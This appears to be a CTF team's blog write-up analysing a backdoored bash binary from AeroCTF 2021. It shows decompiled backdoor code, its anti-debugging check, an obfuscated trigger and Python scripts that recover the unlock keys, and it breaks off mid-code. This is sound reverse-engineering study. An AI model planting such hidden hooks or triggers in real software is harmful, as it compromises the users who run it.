<!doctype html>
<html lang="en-us">
  <head>
    <title>[AeroCTF 2021 - RE] BashD00r // ret2school</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="nasm" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.3c3c186cd62e563ad6e2f00a89dbee656ab912d1d46f856b5605dd0232521e2a.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[AeroCTF 2021 - RE] BashD00r"/>
<meta name="twitter:description" content="Aero CTF 2021 - BashD00r (500 pts) This is the second challenge I was able to solve, and the hardest one. The task is below:
 There seems to be something wrong with our bash.
Can you see if anyone has entered the backdoor?
bash.7z
 So we are given a archive, which contains a &ldquo;bash&rdquo; binary. This binary was backdoored, so we need to find it to get the flag."/>

    <meta property="og:title" content="[AeroCTF 2021 - RE] BashD00r" />
<meta property="og:description" content="Aero CTF 2021 - BashD00r (500 pts) This is the second challenge I was able to solve, and the hardest one. The task is below:
 There seems to be something wrong with our bash.
Can you see if anyone has entered the backdoor?
bash.7z
 So we are given a archive, which contains a &ldquo;bash&rdquo; binary. This binary was backdoored, so we need to find it to get the flag." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ret2school.github.io/post/bashd00r/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-02-28T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-02-28T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
      <span class="app-header-title">ret2school</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/post/list_team/">About</a>
             - 
          
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Just a bunch of french ctf players</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">[AeroCTF 2021 - RE] BashD00r</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Feb 28, 2021
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          11 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
              <a class="tag" href="https://ret2school.github.io/tags/re/">RE</a>
              <a class="tag" href="https://ret2school.github.io/tags/supersnail/">supersnail</a>
              <a class="tag" href="https://ret2school.github.io/tags/aassfxxx/">aaSSfxxx</a>
              <a class="tag" href="https://ret2school.github.io/tags/2021/">2021</a>
              <a class="tag" href="https://ret2school.github.io/tags/unpacking/">unpacking</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="aero-ctf-2021---bashd00r-500-pts">Aero CTF 2021 - BashD00r (500 pts)</h1>
<p>This is the second challenge I was able to solve, and the hardest one. The task is below:</p>
<blockquote>
<p>There seems to be something wrong with our bash.</p>
<p>Can you see if anyone has entered the backdoor?</p>
<p>bash.7z</p>
</blockquote>
<p>So we are given a archive, which contains a &ldquo;bash&rdquo; binary. This binary was backdoored, so we need to find it to get the flag.</p>
<h2 id="bash-backdoor-pt-i">Bash backdoor, Pt. I</h2>
<p>While opening the file on IDA, the entry point isn&rsquo;t disassembled correctly. The entrypoint is placed straddling the &ldquo;.text&rdquo; and the &ldquo;.data&rdquo; section. After defining the instructions on the data section, we can locate the &ldquo;main&rdquo; function:</p>
<pre tabindex="0"><code>_data           segment dword public 'DATA' use64
.data:000000000001ECA2                 assume cs:_data
.data:000000000001ECA2                 ;org 1ECA2h
.data:000000000001ECA2                 db  1Eh
.data:000000000001ECA3                 db 0FAh
.data:000000000001ECA4 ; ---------------------------------------------------------------------------
.data:000000000001ECA4                 xor     ebp, ebp
.data:000000000001ECA6                 mov     r9, rdx
.data:000000000001ECA9                 pop     rsi
.data:000000000001ECAA                 mov     rdx, rsp
.data:000000000001ECAD                 and     rsp, 0FFFFFFFFFFFFFFF0h
.data:000000000001ECB1                 push    rax
.data:000000000001ECB2                 push    rsp
.data:000000000001ECB3                 lea     r8, __libc_csu_fini
.data:000000000001ECBA                 lea     rcx, __libc_csu_init
.data:000000000001ECC1                 lea     rdi, main
.data:000000000001ECC8                 call    cs:off_11EF38
.data:000000000001ECCE                 hlt
.data:000000000001ECCF
</code></pre><p>The main function is huge, thanks to inlined static functions. But we can quickly see that the main function belongs to the &ldquo;shell.c&rdquo; file thanks to some debug function, that look like this:</p>
<pre tabindex="0"><code>.data:00000000000206A5                 call    set_default_locale
.data:00000000000206AA                 call    getuid_0
.data:00000000000206AF                 mov     ebx, eax
.data:00000000000206B1                 cmp     eax, cs:cur_user__uid
.data:00000000000206B7                 jz      short loc_20731
.data:00000000000206B9                 mov     rdi, cs:cur_user__username
.data:00000000000206C0                 test    rdi, rdi
.data:00000000000206C3                 jz      short loc_206D6
.data:00000000000206C5                 mov     edx, 1642
.data:00000000000206CA                 lea     rsi, aShellC    ; &quot;shell.c&quot;
.data:00000000000206D1                 call    print_free
</code></pre><p>So I downloaded the bash 5.1 source tarball (the version can be identified easily thanks to program&rsquo;s strings), and looked at this file. But the corresponding snippet in bash source</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
u <span style="color:#ff79c6">=</span> getuid ();
  <span style="color:#ff79c6">if</span> (current_user.uid <span style="color:#ff79c6">!=</span> u)
    {
      FREE (current_user.user_name);

</code></pre></div><p>is located at line 1292 instead of 1642. So we can tell that the binary has been recompiled from the source with the backdoor injected. I spent some time to identify the file&rsquo;s function, and came across this function that doesn&rsquo;t have anything looking like this in its sources:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
v26 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
  v0 <span style="color:#ff79c6">=</span> (_QWORD <span style="color:#ff79c6">*</span>)sh_malloc(<span style="color:#bd93f9">4096LL</span>, <span style="color:#f1fa8c">&#34;shell.c&#34;</span>, <span style="color:#bd93f9">587LL</span>);
  v0[<span style="color:#bd93f9">511</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  memset(
    (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span>)(v0 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFFFFFFFFFFFF8LL</span>),
    <span style="color:#bd93f9">0</span>,
    <span style="color:#bd93f9">8LL</span> <span style="color:#ff79c6">*</span> (((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)v0 <span style="color:#ff79c6">-</span> (((_DWORD)v0 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFFFF8</span>) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4096</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>));
  <span style="color:#ff79c6">*</span>v0 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xDBEF3510A9ECE437LL</span>;
  v0[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xB557D3ED25ADEB3FLL</span>;
  <span style="color:#ff79c6">*</span>((_BYTE <span style="color:#ff79c6">*</span>)v0 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">40</span>;
  decrypt_string(v0, <span style="color:#bd93f9">17</span>);
  v1 <span style="color:#ff79c6">=</span> fopen_0(v0, <span style="color:#f1fa8c">&#34;r&#34;</span>);
  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>v1 )
    exit_0(<span style="color:#bd93f9">0LL</span>);
  v2 <span style="color:#ff79c6">=</span> v1;
  v3 <span style="color:#ff79c6">=</span> sh_malloc(<span style="color:#bd93f9">1024LL</span>, <span style="color:#f1fa8c">&#34;shell.c&#34;</span>, <span style="color:#bd93f9">645LL</span>);
  v4 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>;

</code></pre></div><p>This function is called as an init vector by <code>__libc_csu_init</code>, before <code>main</code> function is called. The backdoor checks if bash is being debugged by looking for TracerPid field in <code>/proc/self/status</code>. The strings are encrypted with a simple algorithm, I reimplemented in Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decryptbuf</span>(s):
    outpt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
    key <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(s)):
        outpt <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">bytes</span>([s[i] <span style="color:#ff79c6">^</span> key])
        key <span style="color:#ff79c6">=</span> (<span style="color:#bd93f9">4</span><span style="color:#ff79c6">*</span>key <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">52</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">243</span>
    <span style="color:#ff79c6">return</span> outpt

</code></pre></div><p>Then it checks if <code>/home/anon/.profile</code> file exists, and exits if it&rsquo;s not the case. After that, the backdoor tries to read 32 bytes from <code>/proc/self/fd/777</code>.</p>
<p>Now, the real fun begins.</p>
<h2 id="custom-crypto-and-feistel-ciphers">Custom crypto and Feistel ciphers</h2>
<p>The contents of /proc/self/fd/777 is transformed by some encryption algorithm, and then checked against the ciphertext. The decompiled algorithm looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
mysterious_array[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xE9B554BCBF7A0351LL</span>;
mysterious_array[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x200A845B757AFF88LL</span>;
mysterious_array[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x392848A34339A3EELL</span>;
mysterious_array[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x21F8E1C664355C7CLL</span>;
v9 <span style="color:#ff79c6">=</span> strlen((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)buffd) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
bufread <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)buffd;
<span style="color:#6272a4">// snipped some uninteresting parts
</span><span style="color:#6272a4"></span>count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
<span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
{
    v17 <span style="color:#ff79c6">=</span> count;
    <span style="color:#ff79c6">if</span> ( strlen(bufread) <span style="color:#ff79c6">&lt;=</span> count )
        <span style="color:#ff79c6">break</span>;
    seed1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>bufread[count];
    seed2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>bufread[count <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>];
    watconst2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1361583988</span>;
    watconst2[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1740780829</span>;
    watconst2[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1681248625</span>;
    watconst2[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1992688973</span>;
    j_1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
    <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
    {
        v14 <span style="color:#ff79c6">=</span> seed1 <span style="color:#ff79c6">+</span> watconst2[j_1 <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">+</span> seed2 <span style="color:#ff79c6">+</span> j_1 <span style="color:#ff79c6">+</span> (((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)seed2 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">^</span> ((_DWORD)seed2 <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">6</span>));
        <span style="color:#ff79c6">++</span>j_1;
        seed1 <span style="color:#ff79c6">=</span> seed2;
        <span style="color:#ff79c6">if</span> ( j_1 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">48</span> )
        <span style="color:#ff79c6">break</span>;
        seed2 <span style="color:#ff79c6">=</span> v14;
    }
    count <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">8LL</span>;
    <span style="color:#ff79c6">if</span> ( mysterious_array[v17 <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">!=</span> (seed2 <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>) <span style="color:#ff79c6">+</span> v14 )
    {
        print_free(watconst, <span style="color:#f1fa8c">&#34;shell.c&#34;</span>, <span style="color:#bd93f9">563LL</span>);
        <span style="color:#ff79c6">goto</span> LABEL_10;
    }
}

</code></pre></div><p>By looking at the final check <code>mysterious_array[v17 / 8] != (seed2 &lt;&lt; 32) + v14</code>, we can see that fhe first 32 upper bytes of the &ldquo;mysterious_array&rdquo; are the &ldquo;state2&rdquo;, untouched, while the 32 lower bytes are computed with the &ldquo;state2&rdquo;.</p>
<p>The encryption algorithm does 48 rounds of the following transformation (reimplemented in Python), where j is the round number:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_feistel_pass</span>(j, seed1, seed2):
    tmp <span style="color:#ff79c6">=</span> (seed1 <span style="color:#ff79c6">+</span> watconst[j <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">+</span> seed2 <span style="color:#ff79c6">+</span> j <span style="color:#ff79c6">+</span> ((seed2 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">^</span> ((seed2 <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">6</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>))) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>
    <span style="color:#ff79c6">return</span> (seed2, tmp)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encrypt_data</span>(x):
    seed1, seed2 <span style="color:#ff79c6">=</span> struct<span style="color:#ff79c6">.</span>unpack(<span style="color:#f1fa8c">&#34;&lt;II&#34;</span>, x[<span style="color:#bd93f9">0</span>:<span style="color:#bd93f9">8</span>])
    <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">48</span>):
        seed1, seed2 <span style="color:#ff79c6">=</span> do_feistel_pass(j, seed1, seed2)
    <span style="color:#ff79c6">return</span> (seed1, seed2)

</code></pre></div><p>This algorithm can be inverted, since we know seed2 thank to the way it&rsquo;s compared to the &ldquo;mysterious_array&rdquo;. We just need to take care of additions, which are truncated to 32 bits, which discards the additions overflow. So, the decryption function looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">undo_feistel_pass</span>(j, seed2, tmp):
    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
        blup <span style="color:#ff79c6">=</span> watconst[j <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">+</span> seed2 <span style="color:#ff79c6">+</span> j <span style="color:#ff79c6">+</span> ((seed2 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">^</span> ((seed2 <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">6</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>))
        pass1 <span style="color:#ff79c6">=</span> tmp <span style="color:#ff79c6">-</span> blup
        <span style="color:#ff79c6">if</span> pass1 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>:
            <span style="color:#ff79c6">break</span>
        tmp <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">0x100000000</span>
    <span style="color:#ff79c6">return</span> (pass1, seed2)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt_data</span>(x):
    seed2, tmp <span style="color:#ff79c6">=</span> ((x <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">32</span>), x <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>)
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">47</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>):
        seed2, tmp <span style="color:#ff79c6">=</span> undo_feistel_pass(i, seed2, tmp)
    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;II&#34;</span>, seed2, tmp)

</code></pre></div><p>So, after running it on our &ldquo;mysterious_array&rdquo; variable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
bufd <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">32</span>, <span style="color:#bd93f9">8</span>):
    bufd <span style="color:#ff79c6">+=</span> do_unhash_block(mysterious_array[i <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>])

</code></pre></div><p>We get the string that unlocks the &ldquo;first&rdquo; backdoor, and will serve as a key for the next step: <code>eY3HmR6knwflbc1nsq0ILP9KZYQ8DTn</code>.</p>
<p>The next steps decrypts another ELF file with some sort of Salsa20 (thanks the magic consts), but I gave up analyzing it and just dumped the decrypted bin with gdb from a coredump after having patched the binary with int3 instruction after.</p>
<h2 id="analysis-of-the-second-stage">Analysis of the second stage</h2>
<p>The second stage uses the same trick used by the &ldquo;bash&rdquo; binary, which places a part of entrypoint on the &ldquo;.data&rdquo; section. The main function just calls the decryption function with argv[1]. The decryption function looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">do_the_hustle</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>serial)
{
  <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>key; <span style="color:#6272a4">// rbp
</span><span style="color:#6272a4"></span>  _QWORD <span style="color:#ff79c6">*</span>v2; <span style="color:#6272a4">// r12
</span><span style="color:#6272a4"></span>  _QWORD <span style="color:#ff79c6">*</span>v3; <span style="color:#6272a4">// r13
</span><span style="color:#6272a4"></span>
  serial[<span style="color:#bd93f9">31</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
  key <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)calloc_0(<span style="color:#bd93f9">4096LL</span>, <span style="color:#bd93f9">1LL</span>);
  <span style="color:#ff79c6">*</span>key <span style="color:#ff79c6">=</span> _mm_load_si128(xmmword_5060);
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x18u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x94u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x9Eu</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0xC6u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x73u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">5</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x1Au</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">6</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x9Cu</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">7</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0xBEu</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x53u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">9</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x8Du</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">10</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x82u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">11</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x56u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">12</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x99u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">13</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0xB2u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">14</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x23u</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i8[<span style="color:#bd93f9">15</span>] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0xC0u</span>;
  v2 <span style="color:#ff79c6">=</span> (_QWORD <span style="color:#ff79c6">*</span>)malloc_0();
  v3 <span style="color:#ff79c6">=</span> (_QWORD <span style="color:#ff79c6">*</span>)malloc_0();
  serpent_encrypt(serial, (<span style="color:#ff79c6">__int64</span>)key, (<span style="color:#ff79c6">__int64</span>)v2, <span style="color:#bd93f9">0x10u</span>);
  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>v2 <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x9601AAF388AB0192LL</span> <span style="color:#ff79c6">|</span> v2[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x2127591BB4E06735LL</span> )
    <span style="color:#ff79c6">return</span> send_backdoor_status(<span style="color:#bd93f9">0</span>);
  serpent_encrypt((_DWORD <span style="color:#ff79c6">*</span>)serial <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>, (<span style="color:#ff79c6">__int64</span>)key, (<span style="color:#ff79c6">__int64</span>)v3, <span style="color:#bd93f9">0x10u</span>);
  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>v3 <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x582C4E2FDC6C7226LL</span> <span style="color:#ff79c6">|</span> v3[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0xC00B8862110C7A9DLL</span> )
    <span style="color:#ff79c6">return</span> send_backdoor_status(<span style="color:#bd93f9">0</span>);
  send_backdoor_status(<span style="color:#bd93f9">1</span>);
  free_0(v2);
  <span style="color:#ff79c6">return</span> free_0(v3);
}

</code></pre></div><p>The Serpent encryption key is just &ldquo;Dh1IuM7SV7xgZP8q&rdquo; with some XOR obfuscation. The &ldquo;hard&rdquo; part was to identify correctly the algorithm, mais thanks to the secret technique of searching S-Boxes on Google, I came across a chinese blog (<a href="https://ctf.njupt.edu.cn/271.html)">https://ctf.njupt.edu.cn/271.html)</a>, that contained the interesting S-Box</p>
<pre tabindex="0"><code>0x03, 0x08, 0x0F, 0x01, 0x0A, 0x06, 0x05, 0x0B, 0x0E, 0x0D`
</code></pre><p>This blog gave the CTF challenge&rsquo;s name it was taken from (&ldquo;Touch of Satan&rdquo;), and thanks to my OSINT skills, I found another chinese blog (<a href="https://blog.csdn.net/qq_38867330/article/details/102922423">https://blog.csdn.net/qq_38867330/article/details/102922423</a>) that identified it as Serpent.</p>
<p>So I grabbed some ancient Python2 Serpent lib, tweaked it to make it run on Python 3, and after running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#ff79c6">import</span> serpent
z <span style="color:#ff79c6">=</span> serpent<span style="color:#ff79c6">.</span>Serpent(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Dh1IuM7SV7xgZP8q&#34;</span>)
<span style="color:#8be9fd;font-style:italic">bin</span> <span style="color:#ff79c6">=</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;QQQQ&#34;</span>, <span style="color:#bd93f9">0x9601AAF388AB0192</span>, <span style="color:#bd93f9">0x2127591BB4E06735</span>, <span style="color:#bd93f9">0x582C4E2FDC6C7226</span>, <span style="color:#bd93f9">0xC00B8862110C7A9D</span>)
<span style="color:#8be9fd;font-style:italic">print</span>(z<span style="color:#ff79c6">.</span>decrypt(<span style="color:#8be9fd;font-style:italic">bin</span>))

</code></pre></div><p>I got the key <code>0NSlH7m8C91boiGq10NtQKq4aP7mVyJ</code></p>
<h2 id="bash-backdoor-pt-ii">Bash backdoor Pt. II</h2>
<p>Since the previous binary does nothing except sending flag status through a FIFO pipe, we need to find another part of the backdoor in the bash binary.</p>
<p>After losing time digging into the binary (which probably costed me the first blood for this challenge 😥), I found some <code>getenv(&quot;JAKWEULOD&quot;)</code> in the binary, that isn&rsquo;t present into official bash source code.</p>
<p>The function doing the getenv is called at the beginning of the &ldquo;parse_and_execute&rdquo;, patched to run the backdoor. Let&rsquo;s have a look to the added code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
v3 <span style="color:#ff79c6">=</span> backdoor_enabled;
<span style="color:#ff79c6">if</span> ( backdoor_enabled )
  {
